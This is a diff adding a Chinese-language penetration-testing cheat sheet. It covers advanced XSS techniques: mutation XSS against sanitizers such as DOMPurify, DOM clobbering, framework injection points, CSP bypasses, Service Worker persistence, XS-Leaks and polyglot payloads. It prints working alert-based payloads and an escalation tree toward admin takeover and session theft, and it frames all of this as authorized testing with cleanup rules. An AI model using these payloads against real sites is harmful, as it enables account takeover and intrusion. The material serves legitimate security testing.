@@ -1,0 +1,113 @@
+# XSS 高级技巧（mXSS / DOM Clobbering / CSP 绕过 / XS-Leaks）
+
+> 深化 `xss-test.md` 的高级面：沙箱绕过型 XSS（mXSS）、框架 XSS、CSP nonce 绕过、Service Worker 持久化、XS-Leaks 侧信道。均为授权测试验证手法。
+
+## 一、mXSS（Mutation XSS — 沙箱绕过）
+
+**原理**：消毒器（DOMPurify 等）解析 HTML 输出"安全"内容 → 浏览器 innerHTML 重新解析时发生变异 → 生成可执行节点。**消毒器以为安全 ≠ 浏览器实际执行安全**。
+
+### 经典变体
+
+```html
+<!-- 命名空间混淆：SVG/MathML → HTML 集成点 -->
+<math><mtext><table><mglyph><style><!--</style>
+<img title="--&gt;&lt;/mglyph&gt;&lt;img src=1 onerror=alert(1)&gt;">
+
+<!-- 注释变异：<!-- 与 --> 组合在解析中重新配对 -->
+<form><math><mtext></form><form><mglyph><style></math>
+<img src onerror="alert(1)">
+
+<!-- 模板标签变异（<template> 内内容在插入后被重新解析） -->
+```
+
+**实战**：DOMPurify 绕过常出现在评论区/富文本存储 XSS → 管理后台盲打（高危升级）。
+
+## 二、DOM Clobbering（覆盖 JS 变量）
+
+**原理**：注入带 `id`/`name` 的 HTML 元素覆盖 `window.x` / `document.x`，改变前端逻辑（绕过 CSP 或弯掉检查）。
+
+```html
+<!-- 覆盖 window.x -->
+<img id=x>
+<!-- window.x === <img> 元素 -->
+
+<!-- 覆盖嵌套 window.x.y -->
+<form id=x><img name=y>
+<!-- window.x.y === <img> -->
+
+<!-- 利用 clobber 绕过 CSP：无 event handler 也执行 -->
+<a id=x href="javascript:alert(1)">link</a>
+<!-- 若代码用 window.x 拼 URL/做判断 → 被控制 -->
+```
+
+**实战**：找前端 `if (window.config)`/`location = window.redirect` 类检查 → 注入同名元素控制逻辑。
+
+## 三、现代框架 XSS
+
+| 框架 | 注入面 |
+|------|--------|
+| React | `dangerouslySetInnerHTML`、`href`/`src` 属性注入 `javascript:`（sanitize 缺失） |
+| Vue | `v-html`、`template` 属性注入 |
+| Angular | `[innerHTML]`、sanitizer 绕过（`bypassSecurityTrustHtml`） |
+| Svelte | `{@html}` |
+| 模板引擎 | 用户可控数据进模板 = SSTI（见 ssti 矩阵） |
+
+**思路**：不找"通用 XSS"，找**框架逃逸点**（开发绕过安全 API 的地方）。
+
+## 四、CSP 绕过（配合 csp-bypass 基础）
+
+| 面 | 绕过 |
+|----|------|
+| `unsafe-inline` | 直接内联脚本执行 |
+| `unsafe-eval` | eval/setTimeout 字符串 |
+| 白名单域（宽松） | 本域 JSONP 端点/`<script src="/api?callback=x">` 反射执行 |
+| nonce 泄露 | 注入的元素带 nonce（`<script nonce=...>` 反射）或 DOM clobber 借 nonce |
+| `strict-dynamic` | 从可信脚本链式加载恶意脚本（`script` 标签注入 `src`） |
+| Trusted Types 绕过 | `TrustedTypes` 默认策略缺失时 `innerHTML` 可用；或绕过 createPolicy |
+
+**实战**：先拿 CSP 头分析（`curl -I`）→ 找白名单内可控端点（JSONP/上传域）→ 对症打。
+
+## 五、Service Worker XSS 持久化
+
+- 能注册 SW（同源 + HTTPS + SW 文件可控）→ 恶意 SW 拦截所有请求 → **持久 XSS/CSP 失效**
+- 判定：`navigator.serviceWorker.register` 面；缓存投毒型
+
+## 六、XS-Leaks & 侧信道（信息泄露型）
+
+| 技术 | 原理 |
+|------|------|
+| 窗口名/长度检测 | 跨域 iframe 读不了内容但能测长度（`window.length`） |
+| 跳转时间测 | `onload` 延迟判断目标是否登录/存在（跨域布尔差分） |
+| 缓存探测 | 静态资源缓存命中与否 = 用户行为推测 |
+| 错误事件 | `img.onerror` 探测内网 IP/端口（内网扫射） |
+| CSS 注入 | `@import`/`:has()` 选择器探测页面内容 |
+
+**应用**：用户登录状态确认、内网存活探测、CSRF token 无泄漏面下的用户行为推断。低危起步（影响他人隐私常到中危）。
+
+## 七、Polyglot 与浏览器特化
+
+```html
+<!-- 多语境 polyglot：反射进入任意上下文都执行 -->
+"><img src=x onerror=alert(1)>//<svg/onload=alert(1)>
+<!-- CSS 注入: 引号内的 ) 逃逸 -->
+background:url(javascript:alert(1))
+<!-- SVG/PDF/XML 载体 -->
+<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
+```
+
+## 八、升级闭环（XSS 不孤立）
+
+```
+XSS 到手 → 首选升级为高危：
+├─ 管理后台盲打（存储 XSS 打 admin）→ 接管/配置篡改
+├─ 窃取会话（HttpOnly 时先打同源功能）→ 账号接管
+├─ 配合 CSRF（见 csrf-test）→ 改密/改绑
+├─ 打内网（fetch 规定端口/SSRF 链）→ 内网探测
+└─ Service Worker 注册 → 持久控制
+```
+**定级**：能打 admin/窃取他人数据 = 高危；自弹自赏 = 低危（反射）。
+
+## 九、纪律
+- 存储 XSS payload 写入后验证即清理（自己插入的评论/留言删除）
+- 盲打管理后台用无害 payload（弹窗/标记），不窃取 admin 数据
+- XS-Leaks 测试用小样本差分，不做大规模用户行为画像
